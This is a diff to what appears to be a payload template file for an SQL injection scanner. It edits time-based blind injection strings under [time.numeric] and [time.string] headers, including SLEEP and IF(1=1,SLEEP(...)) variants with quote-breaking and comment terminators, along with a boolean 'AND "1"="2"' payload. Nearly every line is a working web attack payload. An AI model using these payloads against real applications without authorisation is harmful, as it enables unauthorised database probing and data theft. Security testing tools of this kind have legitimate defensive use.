@@ -52,13 +52,13 @@
 {sample}" AND "1"="2"-- -
 
 [time.numeric]
+{sample} AND IF(1=1,SLEEP({sleep}),1)
 {sample} AND SLEEP({sleep})
 {sample} OR SLEEP({sleep})
-{sample} AND IF(1=1,SLEEP({sleep}),0)
 {sample}' AND SLEEP({sleep})-- -
 
 [time.string]
+{sample}' AND IF(1=1,SLEEP({sleep}),1)-- -
 {sample}' AND SLEEP({sleep})-- -
 {sample}' OR SLEEP({sleep})-- -
-{sample}' AND IF(1=1,SLEEP({sleep}),0)-- -
 {sample}") OR SLEEP({sleep})-- -
